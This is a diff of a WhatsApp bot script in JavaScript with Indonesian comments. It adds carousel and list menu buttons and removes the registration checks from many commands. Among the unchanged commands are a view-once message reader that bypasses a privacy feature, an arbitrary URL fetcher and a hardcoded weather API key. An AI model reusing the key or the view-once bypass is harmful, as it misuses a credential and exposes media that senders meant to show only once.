-            buttonParamsJson: JSON.stringify({
-              display_text: `Kingz Portofolio`, // Teks untuk tombol
-              url: `https://web-g-ap.vercel.app/` // URL untuk bot
-            })
-          }]
+          buttons: [
+            {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify(listMessage)
+                        },
+                        {
+                            name: "quick_reply", // Tombol Quick Reply
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Ping Bot",
+                                id: `${prefix}ping`
+                            })
+                        },
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "✈Github",
+                                url: "https://github.com/Galangxyz",
+                                merchant_url: "https://www.google.com"
+                            })
+                        }
+          ]
         }
-      }
+      },
+      ...additionalHeaders // Tambahkan header tambahan
     ];
 
-    // Generate carousel message
+    // Generate pesan carousel
     const carouselMessage = generateWAMessageFromContent(m.chat, {
       viewOnceMessage: {
         message: {
@@ -2357,23 +10332,23 @@ case 'grup': {
             deviceListMetadata: {},
             deviceListMetadataVersion: 2
           },
-          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+          interactiveMessage: proto.Message.InteractiveMessage.create({
             body: {
-              text: "> Jangan Lupa Mampir"
+              text: ""
             },
             footer: {
-              text: "Sych Bot x Langz"
+              text: ""
             },
             header: {
               hasMediaAttachment: false
             },
-            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
               cards: carouselCards
             })
           })
         }
       }
-    }, {});
+    }, { quoted: fkontak });
 
     // Kirim pesan carousel
     await sych.relayMessage(m.chat, carouselMessage.message, {
@@ -2390,9 +10365,153 @@ case 'grup': {
   }
 }
 break;
+
+//saluran
+	case 'openbo': {
+let sections = [{
+    title: 'Select Menu',
+    highlight_label: 'Recomended',
+    rows: [
+        {
+            title: `${prefix}allmenu`,
+            description: `Daftar semua menu yang tersedia.`,
+            id: `${prefix}allmenu`
+        },
+        {
+            title: `${prefix}downloadmenu`,
+            description: `Menu untuk mendownload media.`,
+            id: `${prefix}downloadmenu`
+        },
+        {
+            title: `${prefix}ownermenu`,
+            description: `Menu khusus untuk owner.`,
+            id: `${prefix}ownermenu`
+        },
+        {
+            title: `${prefix}groupmenu`,
+            description: `Menu untuk pengelolaan grup.`,
+            id: `${prefix}groupmenu`
+        },
+        {
+            title: `${prefix}funmenu`,
+            description: `Menu hiburan dengan berbagai fitur.`,
+            id: `${prefix}funmenu`
+        },
+        {
+            title: `${prefix}gamemenu`,
+            description: `Menu untuk bermain game.`,
+            id: `${prefix}gamemenu`
+        },
+        {
+            title: `${prefix}aimenu`,
+            description: `Menu AI dan fitur kecerdasan buatan.`,
+            id: `${prefix}aimenu`
+        },
+        {
+            title: `${prefix}toolsmenu`,
+            description: `Menu berisi berbagai tools.`,
+            id: `${prefix}toolsmenu`
+        }
+    ]
+}];
+
+let listMessage = {
+    title: 'Select Menu',
+    sections
+};
+
+let msg = generateWAMessageFromContent(m.chat, {
+    viewOnceMessage: {
+        message: {
+            "messageContextInfo": {
+                "deviceListMetadata": {},
+                "deviceListMetadataVersion": 2
+            },
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+                contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '120363373320014871@newsletter',
+                        newsletterName: 'Powered By Galangxyz',
+                        serverMessageId: -1
+                    },
+                    businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
+                },
+                body: proto.Message.InteractiveMessage.Body.create({
+                    text: `> ${n}加密后内容，不加密时返回传入内容Gala加密内容的lang,xyz加密后的内容true 加密 false 不加密${n}`
+                }),
+                footer: proto.Message.InteractiveMessage.Footer.create({
+                    text: `> Termux Never Die\n\nGa ada yg ga bisa kalo ga nyoba!!`
+                }),
+                header: proto.Message.InteractiveMessage.Header.create({
+                
+                    title: `> Follow my github : ${n}https://github.com/Galangxyz${n}`,
+                    subtitle: "",
+                    hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg" } }, { upload: sych.waUploadToServer }))
+                }),
+                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    buttons: [
+                        {
+                            name: "single_select",
+                            buttonParamsJson: JSON.stringify(listMessage)
+                        },
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Github",
+                                url: "https://github.com/Galangxyz",
+                                merchant_url: "https://www.google.com"
+                            })
+                        },
+                        {
+                            name: "cta_call",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Phone Number",
+                                phone_number: "+6283833735020"
+                            })
+                        },
+                        {
+                            name: "cta_reminder",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Set Reminder",
+                                reminder_time: "2025-01-20T15:00:00Z", // Format ISO8601
+                                reminder_title: "Meeting with Team"
+                            })
+                        },
+                        {
+                            name: "quick_reply", // Tombol Quick Reply
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Ping Bot",
+                                id: `${prefix}ping`
+                            })
+                        },
+                        {
+                            name: "quick_reply", // Tambahan Quick Reply Lain
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Help Center",
+                                id: `${prefix}help`
+                            })
+                        }
+                    ]
+                })
+            })
+        }
+    }
+}, { quoted: fkontak });
+
+await sych.relayMessage(msg.key.remoteJid, msg.message, {
+    messageId: msg.key.id
+});
+}
+break;
+
+
+
+
 			case 'profile':
 			case 'cek': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const user = Object.keys(db.users)
 				const infoUser = db.users[m.sender]
 				await sycreply(`*👤Profile @${m.sender.split('@')[0]}* :\n🐋User Bot : ${user.includes(m.sender) ? 'True' : 'False'}\n🔥User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`)
@@ -2430,7 +10549,7 @@ break;
 			}
 			break
 			case 'totalfitur': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const total = ((fs.readFileSync('./naze.js').toString()).match(/case '/g) || []).length
 				sycreply(`Total Fitur : ${total}`);
 			}
@@ -2448,17 +10567,17 @@ break;
 			break
 			case 'transfer':
 			case 'tf': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				transfer(m, args, db)
 			}
 			break
 			case 'buy': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				buy(m, args, db)
 			}
 			break
 			case 'react': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				sych.sendMessage(m.chat, {
 					react: {
 						text: args[0],
@@ -2468,7 +10587,7 @@ break;
 			}
 			break
 			case 'tagme': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				sych.sendMessage(m.chat, {
 					text: `@${m.sender.split('@')[0]}`,
 					mentions: [m.sender]
@@ -2480,12 +10599,12 @@ break;
 			case 'runtime':
 			case 'ngetes':
 			case 'bot': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let teks = text.split(' ')
 				let set = db.set[botNumber]
 				switch (teks[0]) {
 					case 'mode':
-					    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+					     
 						if (!teks[1]) {
 							return sycreply('Gunakan perintah: mode self/public');
 						}
@@ -2513,7 +10632,7 @@ break;
 					case 'autotyping':
 					case 'autovn':
 					case 'readsw':
-					    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+					     
 						if (teks[1] == 'on') {
 							if (set[teks[0]]) return sycreply('*Sudah Aktif Sebelumnya*')
 							set[teks[0]] = true
@@ -2527,7 +10646,7 @@ break;
 						break
 					case 'set':
 					case 'settings':
-					    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+					     
 						let settingsBot = Object.entries(set).map(([key, value]) => {
 							let list = key == 'status' ? new Date(value).toLocaleString('id-ID', {
 								hour: '2-digit',
@@ -2539,7 +10658,7 @@ break;
 						sycreply(`Settings Bot @${botNumber.split('@')[0]}\n${settingsBot}`);
 						break
 					default:
-					    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+					     
 						if (teks[0] || teks[1]) sycreply(`*Please Sellect Settings :*\n- Mode : *${prefix + command} mode self/public*\n- Anti Call : *${prefix + command} anticall on/off*\n- Auto Bio : *${prefix + command} autobio on/off*\n- autoAi : ${prefix} *autoai on/off*\n- autoAi2 : ${prefix} *autoai2 on/off*\n- Auto Read : *${prefix + command} autoread on/off*\n- Auto Typing : *${prefix + command} autotyping on/off*\n- Auto VoiceNote : *${prefix + command} autovn on/off*\n- Read Sw : *${prefix + command} readsw on/off*`)
 				}
 				if (!teks[0] && !teks[1]) return sych.sendMessage(m.chat, {
@@ -2552,7 +10671,7 @@ break;
 			case 'ping':
 			case 'botstatus':
 			case 'statusbot': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const used = process.memoryUsage()
 				const cpus = os.cpus().map(cpu => {
 					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
@@ -2596,7 +10715,7 @@ break;
 			break
 			case 'speedtest':
 			case 'speed': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				sycreply('Testing Speed...')
 				let cp = require('child_process')
 				let {
@@ -2619,7 +10738,7 @@ break;
 			}
 			break
 			case 'afk': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let user = db.users[m.sender]
 				user.afkTime = +new Date
 				user.afkReason = text
@@ -2629,7 +10748,7 @@ break;
 			case 'readviewonce':
 			case 'readviewone':
 			case 'rvo': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.quoted) return sycreply(`Reply view once message\n*< / >* Example: ${prefix + command}`)
 				try {
 					if (m.quoted.msg.viewOnce) {
@@ -2656,7 +10775,7 @@ break;
 			}
 			break
 			case 'inspect': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply('Masukkan Link Group!')
 				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
 				if (code === null) return sycreply('No invite url detected.');
@@ -2683,7 +10802,7 @@ break;
 			}
 			break
 			case 'addmsg': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.quoted) return sycreply('Reply Pesan Yang Ingin Disave Di Database')
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} file name`)
 				let msgs = db.database
@@ -2695,7 +10814,7 @@ break;
 			break
 			case 'delmsg':
 			case 'deletemsg': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply('Nama msg yg mau di delete?')
 				let msgs = db.database
 				if (text == 'allmsg') {
@@ -2709,7 +10828,7 @@ break;
 			}
 			break
 			case 'getmsg': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
 				let msgs = db.database
 				if (!(text.toLowerCase() in msgs)) return sycreply(`'${text}' tidak terdaftar di list pesan`)
@@ -2717,7 +10836,7 @@ break;
 			}
 			break
 			case 'listmsg': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let seplit = Object.entries(db.database).map(([nama, isi]) => {
 					return {
 						nama,
@@ -2734,7 +10853,7 @@ break;
 		
 // Case untuk listthumb
 case 'listthumb': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 if (!isCreator) return sycreply(mess.owner)
     const thumbList = readThumbList();
     if (thumbList.length === 0) {
@@ -2750,7 +10869,7 @@ if (!isCreator) return sycreply(mess.owner)
 
 // Case untuk addthumb
 case 'addthumb': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 if (!isCreator) return sycreply(mess.owner)
     if (!text) return sycreply(`*< / >* Example: ${prefix + command} thumbnail_name|image_url`);
     let [nama, url] = text.split('|');
@@ -2771,7 +10890,7 @@ if (!isCreator) return sycreply(mess.owner)
 // Case untuk delthumb
 case 'delthumb':
 case 'deletethumb': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 if (!isCreator) return sycreply(mess.owner)
     if (!text) return sycreply('Nama thumbnail yang ingin dihapus?');
     const thumbList = readThumbList();
@@ -2786,7 +10905,7 @@ if (!isCreator) return sycreply(mess.owner)
 }
 			case 'q':
 			case 'quoted': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.quoted) return sycreply('Reply Pesannya!')
 				const anu = await m.getQuotedObj()
 				if (!anu) return sycreply('Format Tidak Tersedia!')
@@ -2800,7 +10919,7 @@ if (!isCreator) return sycreply(mess.owner)
 			case 'confess':
 			case 'menfes':
 			case 'menfess': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (m.isGroup) return sycreply(mess.private)
 				if (menfes[m.sender]) return sycreply(`Kamu Sedang Berada Di Sesi ${command}!`)
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} 62xxxx|Nama Samaran`)
@@ -2840,7 +10959,7 @@ if (!isCreator) return sycreply(mess.owner)
 			case 'delconfess':
 			case 'delmenfes':
 			case 'delmenfess': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!menfes[m.sender]) return sycreply(`Kamu Tidak Sedang Berada Di Sesi ${command.split('del')[1]}!`)
 				let anu = menfes[m.sender]
 				sych.sendMessage(anu.tujuan, {
@@ -2854,7 +10973,7 @@ if (!isCreator) return sycreply(mess.owner)
 			// Tools Menu
 			case 'fetch':
 			case 'get': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!/^https?:\/\//.test(text)) return sycreply('Awali dengan http:// atau https://');
 				try {
 					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
@@ -2870,7 +10989,7 @@ if (!isCreator) return sycreply(mess.owner)
 			break
 			case 'toaud':
 			case 'toaudio': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!/video|audio/.test(mime)) return sycreply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
 				sycreply(mess.wait);
 
@@ -2897,7 +11016,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'tomp3': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!/video|audio/.test(mime)) return sycreply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
 				sycreply(mess.wait);
 
@@ -2925,7 +11044,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'restart':
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!isCreator) return sycreply(mess.owner)
 				sycreply(`restarting ${global.botname}`)
 				sycreply(`Done ✅`)
@@ -2935,7 +11054,7 @@ for (const emoji of reactEmojis) {
 			case 'tovn':
 			case 'toptt':
 			case 'tovoice': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!/video|audio/.test(mime)) return sycreply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
 				sycreply(mess.wait);
 
@@ -2963,7 +11082,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'togif': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!/webp|video/.test(mime)) return sycreply(`Reply Video/Stiker dengan caption *${prefix + command}*`)
 				sycreply(mess.wait);
 
@@ -2997,7 +11116,7 @@ for (const emoji of reactEmojis) {
 			break
 			case 'toimage':
 			case 'toimg': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!/webp|video/.test(mime)) return sycreply(`Reply Video/Stiker dengan caption *${prefix + command}*`)
 				sycreply(mess.wait);
 
@@ -3029,7 +11148,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'toptv': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!/video/.test(mime)) return sycreply(`Kirim/Reply Video Yang Ingin Dijadikan PTV Message Dengan Caption ${prefix + command}`)
 				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
 					const anu = await quoted.download()
@@ -3047,43 +11166,45 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'tourl': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
-				try {
-					if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
-						// Menambahkan pesan loading dan menyimpan key untuk edit nanti
-						let {
-							key
-						} = await sycreply(mess.wait)
+     
+    try {
+        if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
+            let key = "default_key"; // Inisialisasi key sebagai fallback
+            let {
+                key: responseKey
+            } = await sycreply(mess.wait) || {}; // Mendapatkan key dari sycreply atau default
+            if (responseKey) key = responseKey; // Gunakan key dari response jika ada
 
-// Emoji yang akan digunakan
-const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
+            // Emoji yang akan digunakan
+            const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
 
-// Mengirimkan reaksi secara berurutan
-for (const emoji of reactEmojis) {
-    await sych.sendMessage(m.chat, {
-        react: {
-            text: emoji,
-            key: m.key
+            // Mengirimkan reaksi secara berurutan
+            for (const emoji of reactEmojis) {
+                await sych.sendMessage(m.chat, {
+                    react: {
+                        text: emoji,
+                        key: m.key
+                    }
+                });
+            }
+
+            let media = await quoted.download();
+            let anu = await UguuSe(media);
+            // Mengedit pesan setelah URL dihasilkan
+            sycreply('Url : ' + anu.url, {
+                edit: key
+            });
+        } else {
+            sycreply('Send Media yg ingin di Upload!');
         }
-    });
+    } catch (e) {
+        // Mengedit pesan error jika terjadi masalah
+        sycreply('Server Uploader sedang offline!', {
+            edit: key
+        });
+    }
 }
-						let media = await quoted.download();
-						let anu = await UguuSe(media);
-						// Mengedit pesan setelah URL dihasilkan
-						sycreply('Url : ' + anu.url, {
-							edit: key
-						});
-					} else {
-						sycreply('Send Media yg ingin di Upload!');
-					}
-				} catch (e) {
-					// Mengedit pesan error jika terjadi masalah
-					sycreply('Server Uploader sedang offline!', {
-						edit: key
-					});
-				}
-			}
-			break;
+break;
 			case 'img2ibb': {
     try {
         if (!isRegistered){ return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');}
@@ -3126,7 +11247,7 @@ for (const emoji of reactEmojis) {
 }
 break;
 case 'img2base64':
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!quoted || !quoted.message.imageMessage) {
         return sycreply("Silakan balas sebuah gambar untuk dikonversi ke Base64.");
     }
@@ -3157,7 +11278,7 @@ case 'base642img':
     break;
 			case 'tiktokslide':
 			case 'ttslide': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				sycreply(mess.wait);
 
 // Emoji yang akan digunakan
@@ -3324,7 +11445,7 @@ for (const emoji of reactEmojis) {
 			case 'texttospech':
 			case 'tts':
 			case 'tospech': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply('Mana text yg mau diubah menjadi audio?')
 				let {
 					tts
@@ -3341,7 +11462,7 @@ for (const emoji of reactEmojis) {
 			break
 			case 'translate':
 			case 'tr': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (text && text == 'list') {
 					let list_tr = `╭──❍「 *Kode Bahasa* 」❍\n│• af : Afrikaans\n│• ar : Arab\n│• zh : Chinese\n│• en : English\n│• en-us : English (United States)\n│• fr : French\n│• de : German\n│• hi : Hindi\n│• hu : Hungarian\n│• is : Icelandic\n│• id : Indonesian\n│• it : Italian\n│• ja : Japanese\n│• ko : Korean\n│• la : Latin\n│• no : Norwegian\n│• pt : Portuguese\n│• pt : Portuguese\n│• pt-br : Portuguese (Brazil)\n│• ro : Romanian\n│• ru : Russian\n│• sr : Serbian\n│• es : Spanish\n│• sv : Swedish\n│• ta : Tamil\n│• th : Thai\n│• tr : Turkish\n│• vi : Vietnamese\n╰──────❍`;
 					sycreply(list_tr)
@@ -3363,7 +11484,7 @@ for (const emoji of reactEmojis) {
 			break
 			case 'toqr':
 			case 'qr': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`Ubah Text ke Qr dengan *${prefix + command}* textnya`)
 				sycreply(mess.wait);
 
@@ -3392,7 +11513,7 @@ for (const emoji of reactEmojis) {
 			case 'tohd':
 			case 'remini':
 			case 'hd': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (/image/.test(mime)) {
 					let media = await quoted.download()
 					remini(media, 'enhance').then(a => {
@@ -3409,7 +11530,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'shutdown': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!isCreator) {
 					return sycreply('Hanya pemilik bot yang dapat mengeksekusi perintah ini.');
 				}
@@ -3422,7 +11543,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'ssweb': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} https://github.com/nazedev/naze-md`)
 				try {
 					let anu = 'https://' + text.replace(/^https?:\/\//, '')
@@ -3440,14 +11561,14 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'readmore': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let teks1 = text.split`|` [0] ? text.split`|` [0] : ''
 				let teks2 = text.split`|` [1] ? text.split`|` [1] : ''
 				sycreply(teks1 + readmore + teks2)
 			}
 			break
 			case 'getexif': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.quoted) return sycreply(`Reply sticker\nDengan caption ${prefix + command}`)
 				if (!/sticker|webp/.test(quoted.type)) return sycreply(`Reply sticker\nDengan caption ${prefix + command}`)
 				const img = new webp.Image()
@@ -3457,7 +11578,7 @@ for (const emoji of reactEmojis) {
 			break
 			case 'cuaca':
 			case 'weather': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} jakarta`)
 				try {
 					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
@@ -3470,7 +11591,7 @@ for (const emoji of reactEmojis) {
 			case 'sticker':
 case 'colong':
 case 's': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     try {
     
         console.log('Memulai proses konversi ke stiker...');
@@ -3570,7 +11691,7 @@ break;
 			case 'stikmeme':
 			case 'stickermeme':
 			case 'stikermeme': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					console.log('Memulai proses pembuatan stiker meme...');
 					let mime = (quoted.msg || m.msg).mimetype || '';
@@ -3644,7 +11765,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'emojimix': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) {
 					console.log("Input kosong!");
 					return sycreply(`*< / >* Example: ${prefix + command} 😅+🤔`);
@@ -3705,7 +11826,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'reminder': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!text || !args[0] || !args[1]) return sycreply('Gunakan: !reminder [waktu(detik)] [pesan]');
     const time = parseInt(args[0]) * 1000;
     const message = args.slice(1).join(' ');
@@ -3719,7 +11840,7 @@ break;
 			case 'qc':
 			case 'quote':
 			case 'fakechat': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text && !m.quoted) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
 				try {
 					let ppnya = await sych.profilePictureUrl(m.sender, 'image').catch(() => 'https://i.pinimg.com/564x/8a/e9/e9/8ae9e92fa4e69967aa61bf2bda967b7b.jpg');
@@ -3761,8 +11882,10 @@ break;
 				}
 			}
 			break;
+			
+			
 			case 'brat': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`*${prefix + command}* Teksnya`);
 				try {
 					// Log langkah pertama
@@ -3833,7 +11956,7 @@ break;
 				return exifBuffer;
 			}
 			case 'sticktele': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*${prefix + command}* membutuhkan query teks`);
 				try {
 					console.log('Mengambil data dari API Telegram Sticker...');
@@ -3861,7 +11984,7 @@ break;
 			}
 			break;
 			case 'wasted': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					if (/jpg|jpeg|png/.test(mime)) {
 						sycreply(mess.wait);
@@ -3890,7 +12013,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'drivedl': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} url_drive`)
 				if (!text.includes('drive.google.com')) return sycreply('Url Tidak Mengandung Hasil Dari Google Drive!')
 				try {
@@ -3928,7 +12051,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'kucing': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					// Memberi tahu pengguna bahwa gambar sedang dimuat
 					sycreply('Loading, mohon tunggu sebentar...');
@@ -3956,7 +12079,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'encode': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply('Harap masukkan teks yang ingin dienkripsi!');
 				try {
 					// Proses encoding Base64
@@ -3968,7 +12091,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'decode': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply('Harap masukkan teks terenkripsi untuk didekode!');
 				try {
 					// Proses decoding Base64
@@ -3980,7 +12103,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'cekcuaca': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
